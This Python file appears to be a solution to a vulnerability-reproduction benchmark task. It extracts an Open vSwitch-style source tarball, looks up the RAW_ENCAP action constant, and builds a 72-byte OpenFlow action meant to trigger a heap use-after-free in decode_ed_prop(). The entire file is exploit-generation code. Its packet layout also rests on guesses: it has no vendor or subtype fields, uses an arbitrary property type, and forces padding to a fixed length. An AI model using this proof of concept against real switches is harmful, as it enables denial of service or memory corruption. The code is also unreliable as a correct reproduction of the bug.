import struct
import tarfile
import tempfile
import os
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract tarball to find OFPAT_RAW_ENCAP constant
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:gz') as tar:
                tar.extractall(tmpdir)
            
            # Find the constant value for OFPAT_RAW_ENCAP
            # Typically in include/openflow/ ofp-actions.h or similar
            raw_encap_value = self._find_raw_encap_value(tmpdir)
            
            # Build PoC to trigger heap use-after-free
            # The key is to create an action that will cause reallocation
            # during decode_ed_prop(), then use the old pointer
            
            # OpenFlow action header structure:
            # - type (2 bytes)
            # - length (2 bytes)
            # - padding (4 bytes)
            # - data (variable)
            
            # For NXAST_RAW_ENCAP, we need:
            # 1. Action type = raw_encap_value
            # 2. Length that's small enough to cause reallocation
            # 3. Encapsulation data that triggers the bug
            
            # Create a minimal PoC that fits in 72 bytes
            # The vulnerability requires the buffer to need reallocation
            # So we'll create an action with properties that expand during decoding
            
            poc = b''
            
            # Action type - NXAST_RAW_ENCAP
            poc += struct.pack('!H', raw_encap_value)
            
            # Action length - will be updated later
            length_pos = len(poc)
            poc += struct.pack('!H', 0)  # placeholder
            
            # Ethertype for encapsulation
            poc += struct.pack('!H', 0x0800)  # IPv4
            
            # Padding
            poc += b'\x00\x00'
            
            # Encapsulation data - minimal Ethernet header
            # This should trigger the property decoding that causes reallocation
            encap_start = len(poc)
            
            # Destination MAC
            poc += b'\x00' * 6
            # Source MAC  
            poc += b'\x00' * 6
            # EtherType (already set in action)
            # Minimal payload to trigger property parsing
            poc += b'\x00' * 4
            
            # Now add properties that will cause buffer reallocation
            # The key is that these properties need more space than available
            # causing decode_ed_prop() to reallocate
            
            # Property type and length that will expand during decoding
            prop_start = len(poc)
            
            # Create a property that looks like it needs expansion
            # Use property types that trigger complex decoding
            for i in range(3):
                # Property header (type + len)
                poc += struct.pack('!HH', 0x8000, 8)  # Type that triggers expansion
                # Property data that causes the buffer to grow
                poc += b'\xff' * 4
            
            # Update action length
            action_len = len(poc)
            poc = poc[:length_pos] + struct.pack('!H', action_len) + poc[length_pos+2:]
            
            # Ensure we're exactly at 72 bytes (ground truth length)
            if len(poc) > 72:
                poc = poc[:72]
            elif len(poc) < 72:
                poc += b'\x00' * (72 - len(poc))
            
            return poc
    
    def _find_raw_encap_value(self, tmpdir: str) -> int:
        # Search for NXAST_RAW_ENCAP or OFPAT_RAW_ENCAP constant
        # Try common locations first
        
        search_paths = [
            Path(tmpdir) / 'include' / 'openflow',
            Path(tmpdir) / 'include',
            Path(tmpdir)
        ]
        
        patterns = [
            '*raw_encap*',
            '*action*',
            '*.h'
        ]
        
        for search_path in search_paths:
            if not search_path.exists():
                continue
                
            for pattern in patterns:
                for file_path in search_path.rglob(pattern):
                    if file_path.is_file():
                        try:
                            content = file_path.read_text()
                            # Look for constant definitions
                            lines = content.split('\n')
                            for i, line in enumerate(lines):
                                line_lower = line.lower()
                                if 'raw_encap' in line_lower and '#define' in line:
                                    # Try to extract hex value
                                    parts = line.split()
                                    for part in parts:
                                        if part.startswith('0x'):
                                            try:
                                                return int(part, 16)
                                            except ValueError:
                                                pass
                                    # Look at next line if value is on separate line
                                    if i + 1 < len(lines):
                                        next_line = lines[i + 1].strip()
                                        if next_line.startswith('0x'):
                                            try:
                                                return int(next_line, 16)
                                            except ValueError:
                                                pass
                        except (UnicodeDecodeError, PermissionError):
                            continue
        
        # Default value if not found (common in OVS)
        return 0x0019